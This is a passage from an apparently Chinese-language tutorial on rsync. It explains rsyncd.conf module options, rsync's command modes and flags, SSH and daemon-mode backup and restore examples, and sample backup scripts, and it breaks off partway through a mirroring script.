<code>uid/gid</code> 选项一起使用。</p><p><code>exclude from</code>指定一个包含 <code>exclude</code> 模式的定义的文件名，服务器从该文件中读取 <code>exclude</code> 列表定义。</p><p><code>include</code>用来指定不排除符合要求的文件或目录。这等同于在客户端命令中使用<code>–include</code> 来指定模式，结合 <code>include</code> 和 <code>exclude</code> 可以定义复杂的 <code>exclude/include</code> 规则。</p><p><code>include from</code>指定一个包含 <code>include</code> 模式的定义的文件名，服务器从该文件中读取 <code>include</code> 列表定义。</p><p><code>auth users</code>指定由空格或逗号分隔的用户名列表，只有这些用户才允许连接该模块。这里的用户和系统用户没有任何关系。如果”auth users” 被设置，那么客户端发出对该模块的连接请求以后会被 <code>rsync</code> 请求 <code>challenged</code> 进行验证身份这里使用的 <code>challenge/response</code> 认证协议。用户的名和密码以明文方式存放在<code>”secrets file”</code> 选项指定的文件中。默认情况下无需密码就可以连接模块 (也就是匿名方式)。</p><p><code>secrets file</code>指定一个包含定义用户名: 密码对的文件。只有在<code>”auth users”</code> 被定义时，该文件才有作用。文件每行包含一个 <code>username:passwd</code> 对。一般来说密码最好不要超过 <code>8</code> 个字符。没有默认的 <code>secures file</code>，需要限式指定一个 (例如：<code>/etc/rsyncd.passwd</code>)。注意：该文件的权限一定要是 <code>600</code>，否则客户端将不能连接服务器。</p><p><code>strict modes</code>指定是否监测密码文件的权限，如果该选项值为 <code>true</code> 那么密码文件只能被 <code>rsync</code> 服务器运行身份的用户访问，其他任何用户不可以访问该文件。默认值为 <code>true</code>。</p><p><code>hosts allow</code>指定哪些 <code>IP</code> 的客户允许连接该模块。客户模式定义可以是以下形式：</p><ul><li>单个 IP 地址，例如：192.167.0.1</li><li>整个网段，例如：192.168.0.0/24，也可以是 192.168.0.0/255.255.255.0</li><li>多个 IP 或网段需要用空格隔开，<code>“*”</code> 则表示所有，默认是允许所有主机连接。</li></ul><p><code>hosts deny</code>指定不允许连接 <code>rsync</code> 服务器的机器，可以使用 <code>hosts allow</code> 的定义方式来进行定义。默认是没有 <code>hosts deny</code> 定义。</p><p><code>ignore errors</code>指定 <code>rsyncd</code> 在判断是否运行传输时的删除操作时忽略 <code>server</code> 上的 <code>IO</code> 错误，一般来说 <code>rsync</code> 在出现 <code>IO</code> 错误时将将跳过<code>--delete</code>操作，以防止因为暂时的资源不足或其它 <code>IO</code> 错误导致的严重问题。</p><p><code>ignore nonreadable</code>指定 <code>rysnc</code> 服务器完全忽略那些用户没有访问权限的文件。这对于在需要备份的目录中有些文件是不应该被备份者得到的情况是有意义的。</p><p><code>lock file</code>指定支持 <code>max connections</code> 参数的锁文件，默认值是 <code>/var/run/rsyncd.lock</code>。</p><p><code>transfer logging</code>使 <code>rsync</code> 服务器使用 <code>ftp</code> 格式的文件来记录下载和上载操作在自己单独的日志中。</p><p><code>log format</code>通过该选项用户在使用 <code>transfer logging</code> 可以自己定制日志文件的字段。其格式是一个包含格式定义符的字符串，可以使用的格式定义符如下：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%h 远程主机名</span><br><span class="line">%a 远程IP地址</span><br><span class="line">%l 文件长度字符数</span><br><span class="line">%p 该次rsync会话的进程id</span><br><span class="line">%o 操作类型：<span class="string">"send"</span>或<span class="string">"recv"</span></span><br><span class="line">%f 文件名</span><br><span class="line">%P 模块路径</span><br><span class="line">%m 模块名</span><br><span class="line">%t 当前时间</span><br><span class="line">%u 认证的用户名(匿名时是null)</span><br><span class="line">%b 实际传输的字节数</span><br><span class="line">%c 当发送文件时，该字段记录该文件的校验码</span><br><span class="line">默认<span class="built_in">log</span>格式为：`%o %h [%a] %m (%u) %f %l`，一般来说,在每行的头上会添加`%t [%p]`。在源代码中同时发布有一个叫rsyncstats的perl脚本程序来统计这种格式的日志文件。</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>timeout</code>通过该选项可以覆盖客户指定的 <code>IP</code> 超时时间。通过该选项可以确保 <code>rsync</code> 服务器不会永远等待一个崩溃的客户端。超时单位为秒钟，<code>0</code> 表示没有超时定义，这也是默认值。对于匿名 <code>rsync</code> 服务器来说，一个理想的数字是 <code>600</code>。</p><p><code>refuse options</code>通过该选项可以定义一些不允许客户对该模块使用的命令参数列表。这里必须使用命令全名，而不能是简称。但发生拒绝某个命令的情况时服务器将报告错误信息然后退出。如果要防止使用压缩，应该是：<code>dont compress = *</code>。</p><p><code>dont compress</code>用来指定那些不进行压缩处理再传输的文件，默认值是 <code>*.gz</code> <code>*.tgz</code> <code>*.zip</code> <code>*.z</code> <code>*.rpm</code> <code>*.deb</code> <code>*.iso</code> <code>*.bz2</code> <code>*.tbz</code></p><h2 id="Rsync-命令"><a href="#Rsync-命令" class="headerlink" title="Rsync 命令"></a>Rsync 命令</h2><p>在对 rsync 服务器配置结束以后，下一步就需要在客户端发出 rsync 命令来实现将服务器端的文件备份到客户端来。rsync 是一个功能非常强大的工具，其命令也有很多功能特色选项，下面就对它的选项一一进行分析说明。<br>Rsync 的命令格式可以为以下六种：</p><ol><li><code>rsync [OPTION]... SRC DEST</code></li><li><code>rsync [OPTION]... SRC [USER@]HOST:DEST</code></li><li><code>rsync [OPTION]... [USER@]HOST:SRC DEST</code></li><li><code>rsync [OPTION]... [USER@]HOST::SRC DEST</code></li><li><code>rsync [OPTION]... SRC [USER@]HOST::DEST</code></li><li><code>rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]</code></li></ol><p>对应于以上六种命令格式，rsync 有六种不同的工作模式：</p><ol><li>拷贝本地文件。当 SRC 和 DES 路径信息都不包含有单个冒号”:” 分隔符时就启动这种工作模式。如：rsync -a /data /backup</li><li>使用一个远程 shell 程序 (如 rsh、ssh) 来实现将本地机器的内容拷贝到远程机器。当 DST 路径地址包含单个冒号”:”分隔符时启动该模式。如：rsync -avz *.c foo:src</li><li>使用一个远程 shell 程序 (如 rsh、ssh) 来实现将远程机器的内容拷贝到本地机器。当 SRC 地址路径包含单个冒号”:”分隔符时启动该模式。如：rsync -avz foo:src/bar /data</li><li>从远程 rsync 服务器中拷贝文件到本地机。当 SRC 路径信息包含”::” 分隔符时启动该模式。如：rsync -av <a href="mailto:root@172.16.78.192" target="_blank" rel="noopener">root@172.16.78.192</a>::www /databack</li><li>从本地机器拷贝文件到远程 rsync 服务器中。当 DST 路径信息包含”::” 分隔符时启动该模式。如：rsync -av /databack <a href="mailto:root@172.16.78.192" target="_blank" rel="noopener">root@172.16.78.192</a>::www</li><li>列远程机的文件列表。这类似于 rsync 传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync://172.16.78.192/www</li></ol><p>rsync 参数的具体解释如下：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">-v, --verbose 详细模式输出</span><br><span class="line">-q, --quiet 精简输出模式</span><br><span class="line">-c, --checksum 打开校验开关，强制对文件传输进行校验</span><br><span class="line">-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD</span><br><span class="line">-r, --recursive 对子目录以递归模式处理</span><br><span class="line">-R, --relative 使用相对路径信息</span><br><span class="line">-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。</span><br><span class="line">--backup-dir 将备份文件(如~filename)存放在在目录下。</span><br><span class="line">-suffix=SUFFIX 定义备份文件前缀</span><br><span class="line">-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件。(不覆盖更新的文件)</span><br><span class="line">-l, --links 保留软链结</span><br><span class="line">-L, --copy-links 想对待常规文件一样处理软链结</span><br><span class="line">--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结</span><br><span class="line">--safe-links 忽略指向SRC路径目录树以外的链结</span><br><span class="line">-H, --hard-links 保留硬链结</span><br><span class="line">-p, --perms 保持文件权限</span><br><span class="line">-o, --owner 保持文件属主信息</span><br><span class="line">-g, --group 保持文件属组信息</span><br><span class="line">-D, --devices 保持设备文件信息</span><br><span class="line">-t, --<span class="built_in">times</span> 保持文件时间信息</span><br><span class="line">-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间</span><br><span class="line">-n, --dry-run现实哪些文件将被传输</span><br><span class="line">-W, --whole-file 拷贝文件，不进行增量检测</span><br><span class="line">-x, --one-file-system 不要跨越文件系统边界</span><br><span class="line">-B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节</span><br><span class="line">-e, --rsh=COMMAND 指定使用rsh、ssh方式进行数据同步</span><br><span class="line">--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息</span><br><span class="line">-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件</span><br><span class="line">--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件</span><br><span class="line">--delete 删除那些DST中SRC没有的文件</span><br><span class="line">--delete-excluded 同样删除接收端那些被该选项指定排除的文件</span><br><span class="line">--delete-after 传输结束以后再删除</span><br><span class="line">--ignore-errors 及时出现IO错误也进行删除</span><br><span class="line">--max-delete=NUM 最多删除NUM个文件</span><br><span class="line">--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输</span><br><span class="line">--force 强制删除目录，即使不为空</span><br><span class="line">--numeric-ids 不将数字的用户和组ID匹配为用户名和组名</span><br><span class="line">--timeout=TIME IP超时时间，单位为秒</span><br><span class="line">-I, --ignore-times 不跳过那些有同样的时间和长度的文件</span><br><span class="line">--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间</span><br><span class="line">--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0</span><br><span class="line">-T --temp-dir=DIR 在DIR中创建临时文件</span><br><span class="line">--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份</span><br><span class="line">-P 等同于 --partial</span><br><span class="line">--progress 显示备份过程</span><br><span class="line">-z, --compress 对备份的文件在传输时进行压缩处理</span><br><span class="line">--exclude=PATTERN 指定排除不需要传输的文件模式</span><br><span class="line">--include=PATTERN 指定不排除而需要传输的文件模式</span><br><span class="line">--exclude-from=FILE 排除FILE中指定模式的文件</span><br><span class="line">--include-from=FILE 不排除FILE指定模式匹配的文件</span><br><span class="line">--version 打印版本信息</span><br><span class="line">--address 绑定到特定的地址</span><br><span class="line">--config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件</span><br><span class="line">--port=PORT 指定其他的rsync服务端口</span><br><span class="line">--blocking-io 对远程shell使用阻塞IO</span><br><span class="line">-stats 给出某些文件的传输状态</span><br><span class="line">--progress 在传输时现实传输过程</span><br><span class="line">--<span class="built_in">log</span>-format=formAT 指定日志文件格式</span><br><span class="line">--password-file=FILE 从FILE中得到密码</span><br><span class="line">--bwlimit=KBPS 限制I/O带宽，KBytes per second</span><br><span class="line">-h, --<span class="built_in">help</span> 显示帮助信息</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Rsync-使用实例"><a href="#Rsync-使用实例" class="headerlink" title="Rsync 使用实例"></a>Rsync 使用实例</h2><h4 id="SSH-方式"><a href="#SSH-方式" class="headerlink" title="SSH 方式"></a>SSH 方式</h4><p>在服务端启动 ssh 服务<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ service sshd start</span><br><span class="line">启动 sshd： [确定]</span><br></pre></td></tr></tbody></table></figure><p></p><p>使用 rsync 进行同步</p><p>接下来就可以在客户端使用 rsync 命令来备份服务端上的数据了，SSH 方式是通过系统用户来进行备份的，如下：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ rsync -vzrtopg --progress -e ssh --delete work@172.16.78.192:/www/* /databack/experiment/rsync</span><br><span class="line">work@172.16.78.192<span class="string">'s password:</span></span><br><span class="line"><span class="string">receiving file list ...</span></span><br><span class="line"><span class="string">5 files to consider</span></span><br><span class="line"><span class="string">test/</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">0 100% 0.00kB/s 527:35:41 (1, 20.0% of 5)</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">67 100% 65.43kB/s 0:00:00 (2, 40.0% of 5)</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">0 100% 0.00kB/s 527:35:41 (3, 60.0% of 5)</span></span><br><span class="line"><span class="string">dd</span></span><br><span class="line"><span class="string">100663296 100% 42.22MB/s 0:00:02 (4, 80.0% of 5)</span></span><br><span class="line"><span class="string">sent 96 bytes received 98190 bytes 11563.06 bytes/sec</span></span><br><span class="line"><span class="string">total size is 100663363 speedup is 1024.19</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>上面的信息描述了整个的备份过程，以及总共备份数据的大小。</p><h4 id="后台服务方式"><a href="#后台服务方式" class="headerlink" title="后台服务方式"></a>后台服务方式</h4><p><strong>启动 rsync 服务</strong></p><p>编辑 / etc/xinetd.d/rsync 文件，将其中的 disable=yes 改为 disable=no，并重启 xinetd 服务，如下：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># default: off</span></span><br><span class="line"><span class="comment"># description: The rsync server is a good addition to an ftp server, as it \</span></span><br><span class="line"><span class="comment"># allows crc checksumming etc.</span></span><br><span class="line">service rsync</span><br><span class="line">{</span><br><span class="line"><span class="built_in">disable</span> = no</span><br><span class="line">socket_type = stream</span><br><span class="line"><span class="built_in">wait</span> = no</span><br><span class="line">user = root</span><br><span class="line">server = /usr/bin/rsync</span><br><span class="line">server_args = --daemon</span><br><span class="line">log_on_failure += USERID</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ /etc/init.d/xinetd restart</span><br><span class="line">停止 xinetd： [确定]</span><br><span class="line">启动 xinetd： [确定]</span><br></pre></td></tr></tbody></table></figure><p>或者自己手动启动并添加自启动：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/rsync --daemon --config=/etc/rsyncd.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"/usr/bin/rsync --daemon --config=/etc/rsyncd.conf"</span> >> /etc/rc.local</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>创建配置文件</strong></p><p>默认安装好 rsync 程序后，并不会自动创建 rsync 的主配置文件，需要手工来创建，其主配置文件为 “/etc/rsyncd.conf”，创建该文件并插入如下内容：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Minimal configuration file for rsync daemon</span></span><br><span class="line"><span class="comment"># See rsync(1) and rsyncd.conf(5) man pages for help</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################ 以下是公共参数配置 ############################</span></span><br><span class="line"><span class="comment"># This line is required by the /etc/init.d/rsyncd script</span></span><br><span class="line">pid file = /var/run/rsyncd.pid</span><br><span class="line"><span class="comment"># 服务的端口</span></span><br><span class="line">port = 873</span><br><span class="line"><span class="comment"># 服务的IP</span></span><br><span class="line">address = 10.44.201.202</span><br><span class="line"><span class="comment"># 运行的宿主账户，这里为简单就root了</span></span><br><span class="line">uid = root</span><br><span class="line">gid = root</span><br><span class="line"><span class="comment"># 打开（yes）后有个功能是让符号链接可以同步过去（不通过符号链接对应的实际文件）</span></span><br><span class="line">use chroot = no</span><br><span class="line"><span class="comment"># 客户端只读</span></span><br><span class="line"><span class="built_in">read</span> only = yes</span><br><span class="line"><span class="comment">#limit access to private LANs</span></span><br><span class="line">hosts allow=10.51.56.165/255.255.255.0</span><br><span class="line"><span class="comment"># hosts deny=*</span></span><br><span class="line"><span class="comment"># 最大连接数</span></span><br><span class="line">max connections = 5</span><br><span class="line"><span class="comment"># 欢迎信息对应的文件</span></span><br><span class="line"><span class="comment"># motd file = /etc/rsyncd.motd</span></span><br><span class="line"><span class="comment"># 客户端链接的超时时间</span></span><br><span class="line">timeout = 300</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下是日志相关配置，可选使用独立日志文件和系统日志</span></span><br><span class="line"><span class="comment"># This will give you a separate log file</span></span><br><span class="line"><span class="comment"># log file = /var/log/rsync.log</span></span><br><span class="line"><span class="comment"># This will log every file transferred - up to 85,000+ per user, per sync</span></span><br><span class="line"><span class="comment"># transfer logging = yes</span></span><br><span class="line"><span class="comment"># log format = %t %a %m %f %b</span></span><br><span class="line"><span class="comment"># syslog facility = local3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################# 同步模块配置 ################################</span></span><br><span class="line">[thrift]</span><br><span class="line"><span class="comment"># 需要同步的路径</span></span><br><span class="line">path = /data/JiemoLucenes</span><br><span class="line"><span class="comment"># 客户端可以使用list命令列表显示</span></span><br><span class="line">list=yes</span><br><span class="line"><span class="comment"># 忽略错误</span></span><br><span class="line">ignore errors</span><br><span class="line"><span class="comment"># 认证用户</span></span><br><span class="line">auth users = root</span><br><span class="line"><span class="comment"># 认证使用的账户密码文件</span></span><br><span class="line">secrets file = /etc/rsyncd.secrets</span><br><span class="line"><span class="comment"># 备注信息</span></span><br><span class="line">comment = This is nexus data</span><br><span class="line"><span class="comment"># 如果有忽略的子目录，可以通过exclude定义</span></span><br><span class="line"><span class="comment"># exclude = easylife/  samba/</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>创建密码文件</strong><br>采用这种方式不能使用系统用户对客户端进行认证，所以需要创建一个密码文件，其格式为 “username:password”，用户名可以和密码可以随便定义，最好不要和系统帐户一致，同时要把创建的密码文件权限设置为 600，这在前面的模块参数做了详细介绍。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"work:abc123"</span> > /etc/rsyncd.passwd</span><br><span class="line">chmod 600 /etc/rsyncd.passwd</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>备份</strong><br>完成以上工作，现在就可以对数据进行备份了，如下：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ rsync -avz --progress --delete work@172.16.78.192::www /databack/experiment/rsync</span><br><span class="line">Password:</span><br><span class="line">receiving file list ...</span><br><span class="line">6 files to consider</span><br><span class="line">./ files...</span><br><span class="line">a</span><br><span class="line">0 100% 0.00kB/s 528:20:41 (1, 50.0% of 6)</span><br><span class="line">b</span><br><span class="line">67 100% 65.43kB/s 0:00:00 (2, 66.7% of 6)</span><br><span class="line">c</span><br><span class="line">0 100% 0.00kB/s 528:20:41 (3, 83.3% of 6)</span><br><span class="line">dd</span><br><span class="line">100663296 100% 37.49MB/s 0:00:02 (4, 100.0% of 6)</span><br><span class="line">sent 172 bytes received 98276 bytes 17899.64 bytes/sec</span><br><span class="line">total size is 150995011 speedup is 1533.75</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>恢复</strong><br>当服务器的数据出现问题时，那么这时就需要通过客户端的数据对服务端进行恢复，但前提是服务端允许客户端有写入权限，否则也不能在客户端直接对服务端进行恢复，使用 rsync 对数据进行恢复的方法如下：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ rsync -avz --progress /databack/experiment/rsync/ work@172.16.78.192::www</span><br><span class="line">Password:</span><br><span class="line">building file list ...</span><br><span class="line">6 files to consider</span><br><span class="line">./</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">67 100% 0.00kB/s 0:00:00 (2, 66.7% of 6)</span><br><span class="line">c</span><br><span class="line">sent 258 bytes received 76 bytes 95.43 bytes/sec</span><br><span class="line">total size is 150995011 speedup is 452080.87</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>示例脚本</strong><br>这里这些脚本都是 rsync 网站上的例子：<br>1、每隔七天将数据往中心服务器做增量备份<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This script does personal backups to a rsync backup server. You will end up</span></span><br><span class="line"><span class="comment"># with a 7 day rotating incremental backup. The incrementals will go</span></span><br><span class="line"><span class="comment"># into subdirectories named after the day of the week, and the current</span></span><br><span class="line"><span class="comment"># full backup goes into a directory called "current"</span></span><br><span class="line"><span class="comment"># tridge@linuxcare.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># directory to backup</span></span><br><span class="line">BDIR=/home/<span class="variable">$USER</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># excludes file - this contains a wildcard pattern per line of files to exclude</span></span><br><span class="line">EXCLUDES=<span class="variable">$HOME</span>/cron/excludes</span><br><span class="line"></span><br><span class="line"><span class="comment"># the name of the backup machine</span></span><br><span class="line">BSERVER=owl</span><br><span class="line"></span><br><span class="line"><span class="comment"># your password on the backup server</span></span><br><span class="line"><span class="built_in">export</span> RSYNC_PASSWORD=XXXXXX</span><br><span class="line"></span><br><span class="line"><span class="comment">#######################################################################</span></span><br><span class="line"></span><br><span class="line">BACKUPDIR=`date +%A`</span><br><span class="line">OPTS=<span class="string">"--force --ignore-errors --delete-excluded --exclude-from=<span class="variable">$EXCLUDES</span></span></span><br><span class="line"><span class="string">--delete --backup --backup-dir=/<span class="variable">$BACKUPDIR</span> -a"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># the following line clears the last weeks incremental directory</span></span><br><span class="line">[ -d <span class="variable">$HOME</span>/emptydir ] || mkdir <span class="variable">$HOME</span>/emptydir</span><br><span class="line">rsync --delete -a <span class="variable">$HOME</span>/emptydir/ <span class="variable">$BSERVER</span>::<span class="variable">$USER</span>/<span class="variable">$BACKUPDIR</span>/</span><br><span class="line">rmdir <span class="variable">$HOME</span>/emptydir</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the actual transfer</span></span><br><span class="line">rsync <span class="variable">$OPTS</span> <span class="variable">$BDIR</span> <span class="variable">$BSERVER</span>::<span class="variable">$USER</span>/current</span><br></pre></td></tr></tbody></table></figure><p></p><p>2、备份至一个空闲的硬盘<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/bin:/usr/bin:/bin</span><br><span class="line"></span><br><span class="line">LIST=<span class="string">"rootfs usr data data2"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> <span class="variable">$LIST</span>; <span class="keyword">do</span></span><br><span class="line">mount /backup/<span class="variable">$d</span></span><br><span class="line">rsync -ax --exclude fstab --delete /<span class="variable">$d</span>/ /backup/<span class="variable">$d</span>/</span><br><span class="line">umount /backup/<span class="variable">$d</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">DAY=`date <span class="string">"+%A"</span>`</span><br><span class="line"></span><br><span class="line">rsync -a --delete /usr/<span class="built_in">local</span>/apache /data2/backups/<span class="variable">$DAY</span></span><br><span class="line">rsync -a --delete /data/solid /data2/backups/<span class="variable">$DAY</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>3、对 vger.rutgers.edu 的 cvs 树进行镜像<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /var/www/cvs/vger/</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/bin:/usr/freeware/bin:/usr/bin:/bin</span><br><span class="line"></span><br><span class="line">RUN=`lps x | grep rsync | grep -v grep | wc -l`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span 